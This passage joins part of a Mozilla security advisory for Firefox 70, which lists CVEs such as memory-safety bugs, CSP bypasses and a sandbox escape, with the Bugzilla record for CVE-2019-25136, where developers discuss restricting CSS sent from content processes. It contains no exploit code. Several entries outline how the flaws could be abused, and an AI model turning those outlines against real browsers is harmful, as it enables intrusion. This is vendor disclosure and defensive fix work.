When storing a value in IndexedDB, the value's prototype chain is followed and it was possible to retain a reference to a locale, delete it, and subsequently reference it. This resulted in a use-after-free and a potentially exploitable crash.

##### References

* [Bug 1577107](https://bugzilla.mozilla.org/show_bug.cgi?id=1577107)

#### [#CVE-2019-25136: Invalid styles allowed from content processes](#CVE-2019-25136)

Reporter
Emilio Cobos Álvarez
Impact
high
##### Description

A compromised child process could have injected XBL Bindings into privileged CSS rules, resulting in arbitrary code execution and a sandbox escape.

##### References

* [Bug 1530709](https://bugzilla.mozilla.org/show_bug.cgi?id=1530709)

#### [#CVE-2020-12412: Address bar spoof using history navigation and blocked ports](#CVE-2020-12412)

Reporter
Adrian Karolak from ING Tech Poland
Impact
moderate
##### Description

By navigating a tab using the history API, an attacker could cause the address bar to display the incorrect domain (with the https:// scheme, a blocked port number such as '1', and without a lock icon) while controlling the page contents.

##### References

* [Bug 1528587](https://bugzilla.mozilla.org/show_bug.cgi?id=1528587)

#### [#CVE-2019-11759: Stack buffer overflow in HKDF output](#CVE-2019-11759)

Reporter
Guido Vranken
Impact
moderate
##### Description

An attacker could have caused 4 bytes of HMAC output to be written past the end of a buffer stored on the stack. This could be used by an attacker to execute arbitrary code or more likely lead to a crash.

##### References

* [Bug 1577953](https://bugzilla.mozilla.org/show_bug.cgi?id=1577953)

#### [#CVE-2019-11760: Stack buffer overflow in WebRTC networking](#CVE-2019-11760)

Reporter
Nils
Impact
moderate
##### Description

A fixed-size stack buffer could overflow in nrappkit when doing WebRTC signaling. This resulted in a potentially exploitable crash in some instances.

##### References

* [Bug 1577719](https://bugzilla.mozilla.org/show_bug.cgi?id=1577719)

#### [#CVE-2019-11761: Unintended access to a privileged JSONView object](#CVE-2019-11761)

Reporter
Cody Crews
Impact
moderate
##### Description

By using a form with a data URI it was possible to gain access to the privileged `JSONView` object that had been cloned into content. Impact from exposing this object appears to be minimal, however it was a bypass of existing defense in depth mechanisms.

##### References

* [Bug 1561502](https://bugzilla.mozilla.org/show_bug.cgi?id=1561502)

#### [#CVE-2019-11762: document.domain-based origin isolation has same-origin-property violation](#CVE-2019-11762)

Reporter
Kris Maglione
Impact
moderate
##### Description

If two same-origin documents set document.domain differently to become cross-origin, it was possible for them to call arbitrary DOM methods/getters/setters on the now-cross-origin window.

##### References

* [Bug 1582857](https://bugzilla.mozilla.org/show_bug.cgi?id=1582857)

#### [#CVE-2019-11763: Incorrect HTML parsing results in XSS bypass technique](#CVE-2019-11763)

Reporter
Gareth Heyes
Impact
moderate
##### Description

Failure to correctly handle null bytes when processing HTML entities resulted in Firefox incorrectly parsing these entities. This could have led to HTML comment text being treated as HTML which could have led to XSS in a web application under certain conditions. It could have also led to HTML entities being masked from filters, enabling the use of entities to mask the actual characters of interest from filters.

##### References

* [Bug 1584216](https://bugzilla.mozilla.org/show_bug.cgi?id=1584216)

#### [#CVE-2019-11765: Incorrect permissions could be granted to a website](#CVE-2019-11765)

Reporter
Paul Theriault
Impact
moderate
##### Description

A compromised content process could send a message to the parent process that would cause the 'Click to Play' permission prompt to be shown. However, due to lack of validation from the parent process, if the user accepted the permission request an attacker-controlled permission would be granted rather than the 'Click to Play' permission.

##### References

* [Bug 1562582](https://bugzilla.mozilla.org/show_bug.cgi?id=1562582)

#### [#CVE-2019-17000: CSP bypass using object tag with data: URI](#CVE-2019-17000)

Reporter
Yangzheng Li
Impact
moderate
##### Description

An object tag with a data URI did not correctly inherit the document's Content Security Policy. This allowed a CSP bypass in a cross-origin frame if the document's policy explicitly allowed `data:` URIs.

##### References

* [Bug 1441468](https://bugzilla.mozilla.org/show_bug.cgi?id=1441468)

#### [#CVE-2019-17001: CSP bypass using object tag when script-src 'none' is specified](#CVE-2019-17001)

Reporter
Matheus Vrech
Impact
moderate
##### Description

A Content-Security-Policy that blocks in-line scripts could be bypassed using an object tag to execute JavaScript in the protected document (cross-site scripting). This is a separate bypass from CVE-2019-17000.
*Note: This flaw only affected Firefox 69 and was not present in earlier versions.*

##### References

* [Bug 1587976](https://bugzilla.mozilla.org/show_bug.cgi?id=1587976)

#### [#CVE-2019-17002: upgrade-insecure-requests was not being honored for links dragged and dropped](#CVE-2019-17002)

Reporter
Kevin Brosnan
Impact
low
##### Description

If `upgrade-insecure-requests` was specified in the Content Security Policy, and a link was dragged and dropped from that page, the link was not upgraded to https.

##### References

* [Bug 1561056](https://bugzilla.mozilla.org/show_bug.cgi?id=1561056)

#### [#CVE-2019-11764: Memory safety bugs fixed in Firefox 70 and Firefox ESR 68.2](#CVE-2019-11764)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Bob Clary, Jason Kratzer, Aaron Klotz, Iain Ireland, Tyson Smith, Christian Holler, Steve Fink, Honza Bambas, Byron Campen, and Cristian Brindusan reported memory safety bugs present in Firefox 69 and Firefox ESR 68.1. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 70 and Firefox ESR 68.2](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1558522%2C1577061%2C1548044%2C1571223%2C1573048%2C1578933%2C1575217%2C1583684%2C1586845%2C1581950%2C1583463%2C1586599)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_4b2a2d61_20250119_133805.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1530709)
* [XML](/show_bug.cgi?ctype=xml&id=1530709)

Closed
[Bug 1530709](/show_bug.cgi?id=1530709)
(CVE-2019-25136)

Opened 6 years ago
Closed 5 years ago

# Use CSSOM to insert rules in SelectParentHelper.

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Use CSSOM to insert rules in SelectParentHelper.

## Categories

### (Core :: Layout: Form Controls, enhancement, P3)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=Layout%3A%20Form%20Controls#Layout%3A%20Form%20Controls)

Layout: Form Controls
▾

Core :: Layout: Form Controls

Issues with the layout and appearance of HTML form controls, such as buttons, date/time pickers, select elements, and textareas.

Example bugs:

* datepicker remains visible after tabbing out of date input field
* the filename field of <input type=file> renders incorrectly in vertical writing mode with dir=rtl

Specifications covered:

* HTML (§ Forms)

[See Open Bugs in This Component](/buglist.cgi?product=Core&component=Layout%3A%20Form%20Controls&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=Layout%3A%20Form%20Controls&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=Layout%3A%20Form%20Controls)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

enhancement

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P3

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla71

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Performance Impact | --- |
| --- | --- |
| Accessibility Severity | --- |
| Webcompat Priority | --- |
| a11y-review | --- |
| Webcompat Score | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr60 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=wontfix) |
| firefox-esr68 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=wontfix) |
| firefox69 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix) |
| firefox70 | --- | [fixed](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fixed) |
| firefox71 | --- | [fixed](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr60 |  | wontfix |
| firefox-esr68 |  | wontfix |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox69 |  | wontfix |
| firefox70 |  | fixed |
| firefox71 |  | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: emilio, Assigned: freddy, Mentored)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=40)  [freddy](/user_profile?user_id=428608)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

![](https://secure.gravatar.com/avatar/1d91d22a4892f16f744b31fd4286144e?d=mm&size=40)  [emilio](/user_profile?user_id=546716)

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/1d91d22a4892f16f744b31fd4286144e?d=mm&size=40)  [emilio](/user_profile?user_id=546716)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/1d91d22a4892f16f744b31fd4286144e?d=mm&size=40)  [emilio](/user_profile?user_id=546716)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

7 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[1375476](/show_bug.cgi?id=1375476 "VERIFIED FIXED - [e10s] Properly style <option> elements in the parent process UI (support CSS on Select Options)")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[semmle-analysis](/show_bug.cgi?id=1458117 "RESOLVED FIXED - [Meta] tracking for bugs found with Semmle")

Dependency [tree](/showdependencytree.cgi?id=1530709&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1530709)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: csectype-priv-escalation, csectype-sandbox-escape, sec-high, Whiteboard: [post-critsmash-triage][adv-main70+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2019-25136

[Keywords:](/describekeywords.cgi)

[csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---),
[csectype-sandbox-escape](/buglist.cgi?keywords=csectype-sandbox-escape&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[post-critsmash-triage][adv-main70+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [bmaris](/user_profile?user_id=458188) | [qe-verify](#a18650038_458188 "5 years ago") | - |
| --- | --- | --- |
| [bmaris](/user_profile?user_id=458188) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (1 file)

| [Bug 1530709 - Restrict styles to known selectors and single rules per message r=emilio](/attachment.cgi?id=9089019)  [5 years ago](#c1)  [Frederik Braun [:freddy]](/user_profile?user_id=428608)   47 bytes, text/x-phabricator-request | RyanVM : [approval-mozilla-beta+](#c12 "5 years ago") | [Details](/attachment.cgi?id=9089019&action=edit) | [Review](/attachment.cgi?id=9089019) |
| --- | --- | --- |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1530709#c0)• 6 years ago |
|  | |

It would avoid CSS surprises in IPC messages from a potentially compromised content process.

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1530709#a895_546716)• 6 years ago |

Mentor: emilioPriority: -- → P3

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608)  Assignee |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1530709#c1)• 5 years ago |
|  | |

Attached file
[Bug 1530709 - Restrict styles to known selectors and single rules per message r=emilio](attachment.cgi?id=9089019)
— [Details](attachment.cgi?id=9089019&action=edit)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608)  Assignee |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1530709#c2)• 5 years ago |
|  | |

Turns out there's another flow from child->parent for the `insertRule` call in `populateChildren` (currently at line 435).

Blocks: [semmle-analysis](/show_bug.cgi?id=1458117 "RESOLVED FIXED - [Meta] tracking for bugs found with Semmle")

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608)  Assignee |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1530709#c3)• 5 years ago |
|  | |

checkin-needed assuming this is going to be green like its predecessors :)

<https://treeherder.mozilla.org/#/jobs?repo=try&revision=7cddf2c44ba44ece99e8e241d511c5b1fecfb289>

Keywords: [checkin-needed](/buglist.cgi?keywords=checkin-needed&resolution=---)

|  | [Pulsebot](/user_profile?user_id=510726) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1530709#c4)• 5 years ago |
|  | |

Pushed by rmaries@mozilla.com:

<https://hg.mozilla.org/integration/autoland/rev/1b54dc70e042>

Restrict styles to known selectors and single rules per message r=emilio

Keywords: [checkin-needed](/buglist.cgi?keywords=checkin-needed&resolution=---)

|  | [Arthur Iakab [arthur\_iakab]](/user_profile?user_id=600605) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1530709#c5)• 5 years ago |
|  | |

Backed out changeset 1b54dc70e042 ([bug 1530709](/show_bug.cgi?id=1530709 "RESOLVED FIXED - Use CSSOM to insert rules in SelectParentHelper.")) for causing browser-chrome failures on browser\_selectpopup\_colors.js CLOSED TREE

Backout revision <https://hg.mozilla.org/integration/autoland/rev/86eb37e35690fc467ec6a583e7b9681418a14260>

Failed push <https://treeherder.mozilla.org/#/jobs?repo=autoland&selectedJob=264770622&resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunning%2Cpending%2Crunnable&revision=1b54dc70e04270f601ab01861a15e8836cc57926&searchStr=bc>

Failure logs <https://treeherder.mozilla.org/logviewer.html#?job_id=264770622&repo=autoland>

<https://treeherder.mozilla.org/logviewer.html#?job_id=264778744&repo=autoland>

Frederik can you please take a look?

Flags: needinfo?(fbraun)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1530709#c6)• 5 years ago |
|  | |

One of the failures is probably due to background-image being left out of SUPPORTED\_PROPERTIES, when it might in fact be required due to the manual override in <https://searchfox.org/mozilla-central/rev/e5327b05c822cdac24e233afa37d72c0552dbbaf/toolkit/actors/SelectParent.jsm#104>

However, this can't be fixed by just allowing background-image, as the `color` value might break out of the linear-gradient() function and start a new url() thing. I'll have to think some more on how to fix this.

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1530709#c7)• 5 years ago |
|  | |

OK, so I think this needs to go through a parser to be actually safe from escaping. I tried writing into `cssRules[0]["background-color"]` and then reading out of it again, to get some meaningful color back, but that actually just returns whatever has been written in. Nothing we can use safely within `linear-gradient()`.

If I had a dummy HTML element, I could assign to `dummy.style.color` and read out of it again. - That does work.

I fear it could be too costly to do so, so maybe you can think of a smarter thing emilio? I also see you have a lot of pending needinfos. Feel free to redirect me!

Flags: needinfo?(fbraun) → needinfo?(emilio)

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Reporter |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1530709#c8)• 5 years ago |
|  | |

(In reply to Frederik Braun [:freddyb] from [comment #7](/show_bug.cgi?id=1530709#c7 "RESOLVED FIXED - Use CSSOM to insert rules in SelectParentHelper."))

> OK, so I think this needs to go through a parser to be actually safe from escaping. I tried writing into `cssRules[0]["background-color"]` and then reading out of it again, to get some meaningful color back, but that actually just returns whatever has been written in. Nothing we can use safely within `linear-gradient()`.

That is an oversight. `cssRules[0]["background-color"]` is not the right thing to set. That's just setting a random property in the object, which is why it's not doing the right thing.

You need to use `cssRules[0].style["background-color"]`, which will do what you want.

Flags: needinfo?(emilio)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1530709#a17205973_428608)• 5 years ago |

Keywords: [checkin-needed](/buglist.cgi?keywords=checkin-needed&resolution=---)

|  | [Pulsebot](/user_profile?user_id=510726) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1530709#c9)• 5 years ago |
|  | |

Pushed by csabou@mozilla.com:

<https://hg.mozilla.org/integration/autoland/rev/15163b51d8f1>

Restrict styles to known selectors and single rules per message r=emilio

Keywords: [checkin-needed](/buglist.cgi?keywords=checkin-needed&resolution=---)

|  | [Narcis Beleuzu [:NarcisB]](/user_profile?user_id=600627) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1530709#c10)• 5 years ago |
| bugherder | |

<https://hg.mozilla.org/mozilla-central/rev/15163b51d8f1>

Status: NEW → RESOLVEDClosed: 5 years ago
[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → mozilla71

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1530709#a17270100_575867)• 5 years ago |

Assignee: nobody → fbraun

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1530709#c11)• 5 years ago |
|  | |

Comment on [attachment 9089019](/attachment.cgi?id=9089019 "Bug 1530709 - Restrict styles to known selectors and single rules per message r=emilio") [[details]](/attachment.cgi?id=9089019&action=edit "Bug 1530709 - Restrict styles to known selectors and single rules per message r=emilio")

[Bug 1530709](/show_bug.cgi?id=1530709 "RESOLVED FIXED - Use CSSOM to insert rules in SelectParentHelper.") - Restrict styles to known selectors and single rules per message r=emilio

### Beta/Release Uplift Approval Request

* **User impact if declined**: risk of styling bugs in the browser chrome (parent process)
* **Is this code covered by automated tests?**: Yes
* **Has the fix been verified in Nightly?**: Yes
* **Needs manual test from QE?**: No
* **If yes, steps to reproduce**:
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: fix uses a different (safer) API. Functionality & logic is the same. The tests confirm it's working.
* **String changes made/needed**: None
[Attachment #9089019](/attachment.cgi?id=9089019&action=edit "Bug 1530709 - Restrict styles to known selectors and single rules per message r=emilio") -
Flags: approval-mozilla-beta?

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1530709#a17423603_428608)• 5 years ago |

Group: core-securityKeywords: [csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1530709#a17430340_159069)• 5 years ago |

Group: core-security → core-security-release

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1530709#a17536106_75935)• 5 years ago |

[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix)
[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected)
[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
--- → [unaffected](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=unaffected)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [unaffected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=unaffected)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1530709#c12)• 5 years ago |
|  | |

Comment on [attachment 9089019](/attachment.cgi?id=9089019 "Bug 1530709 - Restrict styles to known selectors and single rules per message r=emilio") [[details]](/attachment.cgi?id=9089019&action=edit "Bug 1530709 - Restrict styles to known selectors and single rules per message r=emilio")

[Bug 1530709](/show_bug.cgi?id=1530709 "RESOLVED FIXED - Use CSSOM to insert rules in SelectParentHelper.") - Restrict styles to known selectors and single rules per message r=emilio

Fixes a CSS bug which can potentially lead to incorrect styling in the parent process. Approved for 70.0b8.

[Attachment #9089019](/attachment.cgi?id=9089019&action=edit "Bug 1530709 - Restrict styles to known selectors and single rules per message r=emilio") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1530709#c13)• 5 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/c97e152648be55d4daef8239bafa288aeb797f0e>

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fixed)

|  | [Bogdan Maris, Desktop Test Engineering](/user_profile?user_id=458188) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1530709#a18650028_458188)• 5 years ago |

Whiteboard: [post-critsmash-triage]

|  | [Bogdan Maris, Desktop Test Engineering](/user_profile?user_id=458188) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1530709#a18650038_458188)• 5 years ago |

Flags: qe-verify-

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1530709#a19543786_578488)• 5 years ago |

Whiteboard: [post-critsmash-triage] → [post-critsmash-triage][adv-main70+][adv-main70-rollup]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1530709#a20648021_578488)• 5 years ago |

Whiteboard: [post-critsmash-triage][adv-main70+][adv-main70-rollup] → [post-critsmash-triage][adv-main70+][adv-main70+r]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1530709#a40145057_1689)• 5 years ago |

Group: core-security-release

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1530709#c14)• 2 years ago |
|  | |

Turns out this was an exploitable vulnerability that was used in the wild. Details are available here: <https://blog.google/threat-analysis-group/new-details-on-commercial-spyware-vendor-variston/>

Alias: CVE-2019-25136Whiteboard: [post-critsmash-triage][adv-main70+][adv-main70+r] → [post-critsmash-triage][adv-main70+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1530709#c15)• 2 years ago |
|  | |

Also, because we know this was a sandbox escape, I'm retroactively bumping it to sec-high

Keywords: [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---) → [sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1530709#a128153246_1689)• 2 years ago |

Keywords: [csectype-sandbox-escape](/buglist.cgi?keywords=csectype-sandbox-escape&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1530709#c16)• 2 years ago |
|  | |

